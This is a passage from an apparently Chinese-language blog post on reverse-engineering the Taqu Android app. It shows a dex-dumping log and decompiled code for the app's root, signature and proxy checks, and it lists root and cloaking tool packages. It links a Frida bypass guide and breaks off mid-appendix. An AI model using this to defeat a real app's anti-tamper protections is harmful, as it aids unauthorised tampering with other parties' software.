class="hljs-variable">.xingjiabi</span><span class="hljs-variable">.shengsheng</span>/class12<span class="hljs-variable">.dex</span><br>[dump dex]: /data/data/com<span class="hljs-variable">.xingjiabi</span><span class="hljs-variable">.shengsheng</span>/files/dump_dex_com<span class="hljs-variable">.xingjiabi</span><span class="hljs-variable">.shengsheng</span>/class12<span class="hljs-variable">.dex</span><br>[find dex]: /data/data/com<span class="hljs-variable">.xingjiabi</span><span class="hljs-variable">.shengsheng</span>/files/dump_dex_com<span class="hljs-variable">.xingjiabi</span><span class="hljs-variable">.shengsheng</span>/class13<span class="hljs-variable">.dex</span><br>[dump dex]: /data/data/com<span class="hljs-variable">.xingjiabi</span><span class="hljs-variable">.shengsheng</span>/files/dump_dex_com<span class="hljs-variable">.xingjiabi</span><span class="hljs-variable">.shengsheng</span>/class13<span class="hljs-variable">.dex</span><br>[find dex]: /data/data/com<span class="hljs-variable">.xingjiabi</span><span class="hljs-variable">.shengsheng</span>/files/dump_dex_com<span class="hljs-variable">.xingjiabi</span><span class="hljs-variable">.shengsheng</span>/class14<span class="hljs-variable">.dex</span><br>[dump dex]: /data/data/com<span class="hljs-variable">.xingjiabi</span><span class="hljs-variable">.shengsheng</span>/files/dump_dex_com<span class="hljs-variable">.xingjiabi</span><span class="hljs-variable">.shengsheng</span>/class14<span class="hljs-variable">.dex</span><br>[find dex]: /data/data/com<span class="hljs-variable">.xingjiabi</span><span class="hljs-variable">.shengsheng</span>/files/dump_dex_com<span class="hljs-variable">.xingjiabi</span><span class="hljs-variable">.shengsheng</span>/class15<span class="hljs-variable">.dex</span><br>[dump dex]: /data/data/com<span class="hljs-variable">.xingjiabi</span><span class="hljs-variable">.shengsheng</span>/files/dump_dex_com<span class="hljs-variable">.xingjiabi</span><span class="hljs-variable">.shengsheng</span>/class15<span class="hljs-variable">.dex</span><br>[find dex]: /data/data/com<span class="hljs-variable">.xingjiabi</span><span class="hljs-variable">.shengsheng</span>/files/dump_dex_com<span class="hljs-variable">.xingjiabi</span><span class="hljs-variable">.shengsheng</span>/class16<span class="hljs-variable">.dex</span><br>[dump dex]: /data/data/com<span class="hljs-variable">.xingjiabi</span><span class="hljs-variable">.shengsheng</span>/files/dump_dex_com<span class="hljs-variable">.xingjiabi</span><span class="hljs-variable">.shengsheng</span>/class16<span class="hljs-variable">.dex</span><br>[find dex]: /data/data/com<span class="hljs-variable">.xingjiabi</span><span class="hljs-variable">.shengsheng</span>/files/dump_dex_com<span class="hljs-variable">.xingjiabi</span><span class="hljs-variable">.shengsheng</span>/class17<span class="hljs-variable">.dex</span><br>[dump dex]: /data/data/com<span class="hljs-variable">.xingjiabi</span><span class="hljs-variable">.shengsheng</span>/files/dump_dex_com<span class="hljs-variable">.xingjiabi</span><span class="hljs-variable">.shengsheng</span>/class17<span class="hljs-variable">.dex</span><br>[find dex]: /data/data/com<span class="hljs-variable">.xingjiabi</span><span class="hljs-variable">.shengsheng</span>/files/dump_dex_com<span class="hljs-variable">.xingjiabi</span><span class="hljs-variable">.shengsheng</span>/class18<span class="hljs-variable">.dex</span><br>[dump dex]: /data/data/com<span class="hljs-variable">.xingjiabi</span><span class="hljs-variable">.shengsheng</span>/files/dump_dex_com<span class="hljs-variable">.xingjiabi</span><span class="hljs-variable">.shengsheng</span>/class18<span class="hljs-variable">.dex</span><br>[find dex]: /data/data/com<span class="hljs-variable">.xingjiabi</span><span class="hljs-variable">.shengsheng</span>/files/dump_dex_com<span class="hljs-variable">.xingjiabi</span><span class="hljs-variable">.shengsheng</span>/class19<span class="hljs-variable">.dex</span><br>[dump dex]: /data/data/com<span class="hljs-variable">.xingjiabi</span><span class="hljs-variable">.shengsheng</span>/files/dump_dex_com<span class="hljs-variable">.xingjiabi</span><span class="hljs-variable">.shengsheng</span>/class19<span class="hljs-variable">.dex</span><br>[find dex]: /data/data/com<span class="hljs-variable">.xingjiabi</span><span class="hljs-variable">.shengsheng</span>/files/dump_dex_com<span class="hljs-variable">.xingjiabi</span><span class="hljs-variable">.shengsheng</span>/class20<span class="hljs-variable">.dex</span><br>[dump dex]: /data/data/com<span class="hljs-variable">.xingjiabi</span><span class="hljs-variable">.shengsheng</span>/files/dump_dex_com<span class="hljs-variable">.xingjiabi</span><span class="hljs-variable">.shengsheng</span>/class20<span class="hljs-variable">.dex</span><br></code></pre></td></tr></table></figure><p>在手机内可以看到脱壳出来的dex 文件，随后直接拖到jadx里，就可以分析了。<br><img src="/70__%E9%80%86%E5%90%91__%E4%BB%96%E8%B6%A3APP.assets/image-20240111224602621.png"></p><h1 id="分析app内各种检测"><a href="#分析app内各种检测" class="headerlink" title="分析app内各种检测"></a>分析app内各种检测</h1><p>分析app 反调试、运行环境检测技术。</p><h2 id="root-检测"><a href="#root-检测" class="headerlink" title="root 检测"></a>root 检测</h2><p>前面我们知道app 会对运行环境进行检测，但是直接搜索 字符串 弹窗的信息，是搜不出来的，这是由于 apk 对字符串做了base64 处理。</p><p>然后以前分析过一些对root 环境监测的代码，所以这里直接搜索，定位到代码 cn.taqu.lib.base.utils.AppAntiUtils.isDeviceRooted()<br><img src="/70__%E9%80%86%E5%90%91__%E4%BB%96%E8%B6%A3APP.assets/image-20240112145319294.png"><br><img src="/70__%E9%80%86%E5%90%91__%E4%BB%96%E8%B6%A3APP.assets/image-20240114160423598.png"></p><p>然后找到这一块的代码<br><img src="/70__%E9%80%86%E5%90%91__%E4%BB%96%E8%B6%A3APP.assets/image-20240112145342031.png"></p><p>base64 解码<br><img src="/70__%E9%80%86%E5%90%91__%E4%BB%96%E8%B6%A3APP.assets/image-20240112145108350.png"></p><p>另外还看到不仅仅对 su 进行检测，还检测了其他的项，如下函数。这个函数在 cn.taqu.lib.base.utils.AppAntiUtils.initAnti() 初始化的时候调用，</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs coq">public static boolean isDeviceRooted(RootBeer rootBeer) &#123;<br>  <br>    HbTrace.d(<span class="hljs-number">38850</span>);<br>    boolean z2 = rootBeer.checkForBinary(x.f13157a) |<span class="hljs-type">| rootBeer</span>.checkForDangerousProps() |<span class="hljs-type">| rootBeer</span>.checkForRWPaths() |<span class="hljs-type">| rootBeer</span>.detectTestKeys() |<span class="hljs-type">| rootBeer</span>.checkSuExists() |<span class="hljs-type">| rootBeer</span>.checkForRootNative() |<span class="hljs-type">| rootBeer</span>.checkForMagiskBinary();<br>    HbTrace.h(<span class="hljs-number">38850</span>);<br>    <span class="hljs-keyword">return</span> z2;<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看到调用了 isDeviceRooted，两个重构函数，来判断是否root，最后弹窗</p><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs lasso"><span class="hljs-literal">cn</span>.taqu.lib.base.utils.AppAntiUtils.initAnti()<br><br><span class="hljs-keyword">if</span> (!AppAntiUtils.access$<span class="hljs-number">900</span>() &amp;&amp; !AppAntiUtils.access$<span class="hljs-number">1000</span>() &amp;&amp; <span class="hljs-string">&quot;1&quot;</span>.<span class="hljs-keyword">equals</span>(AppAntiUtils.access$<span class="hljs-number">200</span>())) &#123;<br><span class="hljs-built_in">boolean</span> isDeviceRooted = AppAntiUtils.isDeviceRooted(); <span class="hljs-comment">// 判断su</span><br><span class="hljs-built_in">boolean</span> isDeviceRooted2 = AppAntiUtils.isDeviceRooted(RootBeer.this); <span class="hljs-comment">// 判断其他</span><br><span class="hljs-keyword">if</span> (isDeviceRooted2 || isDeviceRooted) &#123;<br>Loger.g(AppAntiUtils.<span class="hljs-built_in">TAG</span>, PushConstants.PUSH_VALUE_ROOT);<br>XLogUpload.k(<span class="hljs-string">&quot;AntiRoot&quot;</span>).b(<span class="hljs-string">&quot;device rooted.&quot;</span>).m(<span class="hljs-string">&quot;RootBeer&quot;</span>, <span class="hljs-built_in">String</span>.valueOf(isDeviceRooted2)).m(<span class="hljs-string">&quot;DeviceRooted&quot;</span>, <span class="hljs-built_in">String</span>.valueOf(isDeviceRooted)).o();<br>AppAntiUtils.access$<span class="hljs-number">1100</span>();  <span class="hljs-comment">// 弹窗</span><br>&#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>这里来分析一下 isDeviceRooted(RootBeer rootBeer) 内对运行环境是如何检测的代码。<br>首先分析一下 rootBeer.checkForBinary(x.f13157a)，这个函数是检测在一些文件路径内是否存在 x.f13157a ( su 文件 )， 有关Const.getPaths() 函数的代码详见附录 1 。</p><figure class="highlight processing"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs processing"><span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">checkForBinary</span>(<span class="hljs-built_in">String</span> <span class="hljs-built_in">str</span>) &#123;<br>    <span class="hljs-built_in">String</span>[] paths;<br>    <span class="hljs-type">boolean</span> z2 = <span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-built_in">String</span> str2 : Const.<span class="hljs-property">getPaths</span>()) &#123;<br>        <span class="hljs-built_in">String</span> str3 = str2 + <span class="hljs-built_in">str</span>;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">new </span><span class="hljs-class title_">File</span>(str2, <span class="hljs-built_in">str</span>).<span class="hljs-property">exists</span>()) &#123;<br>            QLog.<span class="hljs-property">v</span>(str3 + <span class="hljs-string">&quot; binary detected!&quot;</span>);<br>            z2 = <span class="hljs-literal">true</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> z2;<br>&#125;<br><br></code></pre></td></tr></table></figure><p> rootBeer.checkForDangerousProps() 就是判断系统的调试模式是否被打开。</p><figure class="highlight processing"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs processing"><span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">checkForDangerousProps</span>() &#123;<br>    <span class="hljs-built_in">HashMap</span> hashMap = <span class="hljs-keyword">new </span><span class="hljs-class title_">HashMap</span>();<br>    hashMap.<span class="hljs-property">put</span>(<span class="hljs-string">&quot;ro.debuggable&quot;</span>, <span class="hljs-string">&quot;1&quot;</span>);<br>    hashMap.<span class="hljs-property">put</span>(<span class="hljs-string">&quot;ro.secure&quot;</span>, <span class="hljs-string">&quot;0&quot;</span>);<br>    <span class="hljs-built_in">String</span>[] propsReader = <span class="hljs-title function_">propsReader</span>();<br>    <span class="hljs-keyword">if</span> (propsReader == <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>    <span class="hljs-type">boolean</span> z2 = <span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-built_in">String</span> <span class="hljs-built_in">str</span> : propsReader) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-built_in">String</span> str2 : hashMap.<span class="hljs-property">keySet</span>()) &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">str</span>.<span class="hljs-property">contains</span>(str2)) &#123;<br>                <span class="hljs-built_in">String</span> str3 = <span class="hljs-string">&quot;[&quot;</span> + ((<span class="hljs-built_in">String</span>) hashMap.<span class="hljs-property">get</span>(str2)) + <span class="hljs-string">&quot;]&quot;</span>;<br>                <span class="hljs-keyword">if</span> (<span class="hljs-built_in">str</span>.<span class="hljs-property">contains</span>(str3)) &#123;<br>                    QLog.<span class="hljs-property">v</span>(str2 + <span class="hljs-string">&quot; = &quot;</span> + str3 + <span class="hljs-string">&quot; detected!&quot;</span>);<br>                    z2 = <span class="hljs-literal">true</span>;<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> z2;<br></code></pre></td></tr></table></figure><p>rootBeer.checkForRWPaths() 检查系统中是否存在被挂载为可读写（rw）权限的应用程序数据目录以及其他指定的路径，并返回一个布尔值表示是否存在这样的路径。该函数会读取系统中关于挂载点的信息，检查每一个挂载点的路径和权限信息，如果发现某个路径被挂载为可读写权限，则会输出相应的日志信息并将返回值设为 true。该函数可以用于检测系统安全性，防止应用程序滥用高权限目录，代码太长，详见 附录 2 。</p><p>rootBeer.detectTestKeys() 该函数会读取设备的 Build.TAGS 字段是否有 “ test-keys ”，检测当前设备是否使用测试用的密钥签名。</p><p>root.Beer. checkSuExists() 函数会调用 which 命令，查找是否存在 su 命令。</p><p>rootBeer.checkForRootNative() 函数会加载本地 toolChecker 的 lib 库文件来检测是否被获取root 权限，调用 native 内的 checkForRoot() 函数，来判断设备是否获得root权限，其实还是检测是否存在 su 文件。</p><figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs aspectj"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">RootBeerNative</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">boolean</span> libraryLoaded = <span class="hljs-keyword">false</span>;<br><br>    <span class="hljs-keyword">static</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            System.loadLibrary(<span class="hljs-string">&quot;toolChecker&quot;</span>);<br>            libraryLoaded = <span class="hljs-keyword">true</span>;<br>        &#125; <span class="hljs-keyword">catch</span> (UnsatisfiedLinkError e) &#123;<br>            QLog.e(e);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">native</span> <span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">checkForRoot</span><span class="hljs-params">(Object[] objArr)</span></span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">native</span> <span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">setLogDebugMessages</span><span class="hljs-params">(<span class="hljs-keyword">boolean</span> z2)</span></span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">boolean</span> <span class="hljs-title">wasNativeLibraryLoaded</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> libraryLoaded;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>rootBeer.checkForMagiskBinary() 检测是否存在Magisk 面具，如果进程名被更改就检测不到了。</p><figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs aspectj"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">boolean</span> <span class="hljs-title">checkForMagiskBinary</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">return</span> <span class="hljs-title">checkForBinary</span><span class="hljs-params">(<span class="hljs-string">&quot;magisk&quot;</span>)</span></span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>其实还有一些检测的代码，这个app 对root 检测已经是相当的全面了。</p><h2 id="完整性签名校验"><a href="#完整性签名校验" class="headerlink" title="完整性签名校验"></a>完整性签名校验</h2><p>计算签名摘要，进行对比。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs awk">&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!sHbSignature.equals(getSHA1Signature(BaseApplication.getInstance()))) &#123;<br>    XLogUpload.k(<span class="hljs-string">&quot;AntiSign&quot;</span>).b(<span class="hljs-string">&quot;签名文件不一致&quot;</span>).o();<br>    ToastUtils.b(BaseApplication.getInstance(), new String(Base64.decode(<span class="hljs-string">&quot;5qOA5rWL5Yiw5oKo5a6J6KOF5YiwQVBQ5a2Y5Zyo6Zeu6aKY77yM5Li65LqG5L+d6K+B5q2j5bi45L2/55So6K+35LiL6L295a6Y5pa554mI5pys&quot;</span>, <span class="hljs-number">0</span>)));<br>    System.<span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);<br>    HbTrace.h(<span class="hljs-number">38784</span>);<br><br><br><br><br></code></pre></td></tr></table></figure><h2 id="代理检测"><a href="#代理检测" class="headerlink" title="代理检测"></a>代理检测</h2><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">cn.taqu.lib.base.utils.AppAntiUtils line21~line22<br><br><span class="hljs-keyword">if</span> (!AppAntiUtils.<span class="hljs-keyword">access</span><span class="hljs-meta">$600</span>() &amp;&amp; !AppAntiUtils.<span class="hljs-keyword">access</span><span class="hljs-meta">$700</span>() &amp;&amp; !ApplicationHelper.u() &amp;&amp; OkHttpDns.a(BaseApplication.getInstance())) &#123;<br>AppAntiUtils.<span class="hljs-keyword">access</span><span class="hljs-meta">$800</span>();<br>&#125;<br><br>hb.common.helper.OKHttpDns line1~line2<br>    <span class="hljs-built_in">public</span> static <span class="hljs-type">boolean</span> a(Context ctx) &#123;<br>        HbTrace.d(<span class="hljs-number">44874</span>);<br>        String property = <span class="hljs-keyword">System</span>.getProperty(&quot;http.proxyHost&quot;);<br>        String property2 = <span class="hljs-keyword">System</span>.getProperty(&quot;http.proxyPort&quot;);<br>        <span class="hljs-keyword">if</span> (property2 == <span class="hljs-keyword">null</span>) &#123;<br>            property2 = &quot;-1&quot;;<br>        &#125;<br>        <span class="hljs-type">boolean</span> z2 = (property == <span class="hljs-keyword">null</span> || <span class="hljs-type">Integer</span>.parseInt(property2) == <span class="hljs-number">-1</span>) ? <span class="hljs-keyword">false</span> : <span class="hljs-keyword">true</span>;<br>        HbTrace.h(<span class="hljs-number">44874</span>);<br>        <span class="hljs-keyword">return</span> z2;<br>    &#125;<br></code></pre></td></tr></table></figure><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p>APP 使用frida 反调试检测绕过<br><a href="https://www.cnblogs.com/dxmao/articles/17678351.html">https://www.cnblogs.com/dxmao/articles/17678351.html</a></p><p>视频讲解<br><a href="https://www.bilibili.com/video/BV1e94y1V7wZ/?spm_id_from=333.999.0.0&vd_source=cd4aba572b443cbbb4c522c3c649652d">https://www.bilibili.com/video/BV1e94y1V7wZ/?spm_id_from=333.999.0.0&amp;vd_source=cd4aba572b443cbbb4c522c3c649652d</a></p><h1 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h1><h2 id="附录-1"><a href="#附录-1" class="headerlink" title="附录 1"></a>附录 1</h2><figure class="highlight processing"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs processing"><span class="hljs-keyword">package</span> com.<span class="hljs-property">scottyab</span>.<span class="hljs-property">rootbeer</span>;<br><br><span class="hljs-keyword">import</span> java.<span class="hljs-property">util</span>.<span class="hljs-property">ArrayList</span>;<br><span class="hljs-keyword">import</span> java.<span class="hljs-property">util</span>.<span class="hljs-property">Arrays</span>;<br><span class="hljs-keyword">import</span> me.<span class="hljs-property">panpf</span>.<span class="hljs-property">sketch</span>.<span class="hljs-property">uri</span>.<span class="hljs-property">FileUriModel</span>;<br><br><span class="hljs-comment">/* loaded from: E:\file\android逆向\蓝狐视频\他趣app\class13.dex */</span><br><span class="hljs-keyword">final</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Const</span> &#123;<br>    <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-built_in">String</span> BINARY_BUSYBOX = <span class="hljs-string">&quot;busybox&quot;</span>;<br>    <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-built_in">String</span> BINARY_SU = <span class="hljs-string">&quot;su&quot;</span>;<br>    <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-built_in">String</span>[] knownRootAppsPackages = &#123;<span class="hljs-string">&quot;com.noshufou.android.su&quot;</span>, <span class="hljs-string">&quot;com.noshufou.android.su.elite&quot;</span>, <span class="hljs-string">&quot;eu.chainfire.supersu&quot;</span>, <span class="hljs-string">&quot;com.koushikdutta.superuser&quot;</span>, <span class="hljs-string">&quot;com.thirdparty.superuser&quot;</span>, <span class="hljs-string">&quot;com.yellowes.su&quot;</span>, <span class="hljs-string">&quot;com.topjohnwu.magisk&quot;</span>, <span class="hljs-string">&quot;com.kingroot.kinguser&quot;</span>, <span class="hljs-string">&quot;com.kingo.root&quot;</span>, <span class="hljs-string">&quot;com.smedialink.oneclickroot&quot;</span>, <span class="hljs-string">&quot;com.zhiqupk.root.global&quot;</span>, <span class="hljs-string">&quot;com.alephzain.framaroot&quot;</span>&#125;;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-built_in">String</span>[] knownDangerousAppsPackages = &#123;<span class="hljs-string">&quot;com.koushikdutta.rommanager&quot;</span>, <span class="hljs-string">&quot;com.koushikdutta.rommanager.license&quot;</span>, <span class="hljs-string">&quot;com.dimonvideo.luckypatcher&quot;</span>, <span class="hljs-string">&quot;com.chelpus.lackypatch&quot;</span>, <span class="hljs-string">&quot;com.ramdroid.appquarantine&quot;</span>, <span class="hljs-string">&quot;com.ramdroid.appquarantinepro&quot;</span>, <span class="hljs-string">&quot;com.android.vending.billing.InAppBillingService.COIN&quot;</span>, <span class="hljs-string">&quot;com.android.vending.billing.InAppBillingService.LUCK&quot;</span>, <span class="hljs-string">&quot;com.chelpus.luckypatcher&quot;</span>, <span class="hljs-string">&quot;com.blackmartalpha&quot;</span>, <span class="hljs-string">&quot;org.blackmart.market&quot;</span>, <span class="hljs-string">&quot;com.allinone.free&quot;</span>, <span class="hljs-string">&quot;com.repodroid.app&quot;</span>, <span class="hljs-string">&quot;org.creeplays.hack&quot;</span>, <span class="hljs-string">&quot;com.baseappfull.fwd&quot;</span>, <span class="hljs-string">&quot;com.zmapp&quot;</span>, <span class="hljs-string">&quot;com.dv.marketmod.installer&quot;</span>, <span class="hljs-string">&quot;org.mobilism.android&quot;</span>, <span class="hljs-string">&quot;com.android.wp.net.log&quot;</span>, <span class="hljs-string">&quot;com.android.camera.update&quot;</span>, <span class="hljs-string">&quot;cc.madkite.freedom&quot;</span>, <span class="hljs-string">&quot;com.solohsu.android.edxp.manager&quot;</span>, <span class="hljs-string">&quot;org.meowcat.edxposed.manager&quot;</span>, <span class="hljs-string">&quot;com.xmodgame&quot;</span>, <span class="hljs-string">&quot;com.cih.game_cih&quot;</span>, <span class="hljs-string">&quot;com.charles.lpoqasert&quot;</span>, <span class="hljs-string">&quot;catch_.me_.if_.you_.can_&quot;</span>&#125;;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-built_in">String</span>[] knownRootCloakingPackages = &#123;<span class="hljs-string">&quot;com.devadvance.rootcloak&quot;</span>, <span class="hljs-string">&quot;com.devadvance.rootcloakplus&quot;</span>, <span class="hljs-string">&quot;de.robv.android.xposed.installer&quot;</span>, <span class="hljs-string">&quot;com.saurik.substrate&quot;</span>, <span class="hljs-string">&quot;com.zachspong.temprootremovejb&quot;</span>, <span class="hljs-string">&quot;com.amphoras.hidemyroot&quot;</span>, <span class="hljs-string">&quot;com.amphoras.hidemyrootadfree&quot;</span>, <span class="hljs-string">&quot;com.formyhm.hiderootPremium&quot;</span>, <span class="hljs-string">&quot;com.formyhm.hideroot&quot;</span>&#125;;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-built_in">String</span>[] suPaths = &#123;<span class="hljs-string">&quot;/data/local/&quot;</span>, <span class="hljs-string">&quot;/data/local/bin/&quot;</span>, <span class="hljs-string">&quot;/data/local/xbin/&quot;</span>, <span class="hljs-string">&quot;/sbin/&quot;</span>, <span class="hljs-string">&quot;/su/bin/&quot;</span>, <span class="hljs-string">&quot;/system/bin/&quot;</span>, <span class="hljs-string">&quot;/system/bin/.ext/&quot;</span>, <span class="hljs-string">&quot;/system/bin/failsafe/&quot;</span>, <span class="hljs-string">&quot;/system/sd/xbin/&quot;</span>, <span class="hljs-string">&quot;/system/usr/we-need-root/&quot;</span>, <span class="hljs-string">&quot;/system/xbin/&quot;</span>, <span class="hljs-string">&quot;/cache/&quot;</span>, <span class="hljs-string">&quot;/data/&quot;</span>, <span class="hljs-string">&quot;/dev/&quot;</span>&#125;;<br>    <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-built_in">String</span>[] pathsThatShouldNotBeWritable = &#123;<span class="hljs-string">&quot;/system&quot;</span>, <span class="hljs-string">&quot;/system/bin&quot;</span>, <span class="hljs-string">&quot;/system/sbin&quot;</span>, <span class="hljs-string">&quot;/system/xbin&quot;</span>, <span class="hljs-string">&quot;/vendor/bin&quot;</span>, <span class="hljs-string">&quot;/sbin&quot;</span>, <span class="hljs-string">&quot;/etc&quot;</span>&#125;;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-title function_">Const</span>() <span class="hljs-keyword">throws</span> InstantiationException &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new </span><span class="hljs-class title_">InstantiationException</span>(<span class="hljs-string">&quot;This class is not for instantiation&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/* JADX INFO: Access modifiers changed from: package-private */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-built_in">String</span>[] <span class="hljs-title function_">getPaths</span>() &#123;<br>        <span class="hljs-built_in">ArrayList</span> arrayList = <span class="hljs-keyword">new </span><span class="hljs-class title_">ArrayList</span>(Arrays.<span class="hljs-property">asList</span>(suPaths));<br>        <span class="hljs-built_in">String</span> <span class="hljs-built_in">str</span> = System.<span class="hljs-property">getenv</span>(<span class="hljs-string">&quot;PATH&quot;</span>);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">str</span> != <span class="hljs-literal">null</span> &amp;&amp; !<span class="hljs-string">&quot;&quot;</span>.<span class="hljs-property">equals</span>(<span class="hljs-built_in">str</span>)) &#123;<br>            <span class="hljs-built_in">String</span>[] <span class="hljs-built_in">split</span> = <span class="hljs-built_in">str</span>.<span class="hljs-property">split</span>(<span class="hljs-string">&quot;:&quot;</span>);<br>            <span class="hljs-type">int</span> length = <span class="hljs-built_in">split</span>.<span class="hljs-property">length</span>;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i2 = <span class="hljs-number">0</span>; i2 &lt; length; i2++) &#123;<br>                <span class="hljs-built_in">String</span> str2 = <span class="hljs-built_in">split</span>[i2];<br>                <span class="hljs-keyword">if</span> (!str2.<span class="hljs-property">endsWith</span>(FileUriModel.<span class="hljs-property">SCHEME</span>)) &#123;<br>                    str2 = str2 + <span class="hljs-string">&#x27;/&#x27;</span>;<br>                &#125;<br>                <span class="hljs-keyword">if</span> (!arrayList.<span class="hljs-property">contains</span>(str2)) &#123;<br>                    arrayList.<span class="hljs-property">add</span>(str2);<br>                &#125;<br>            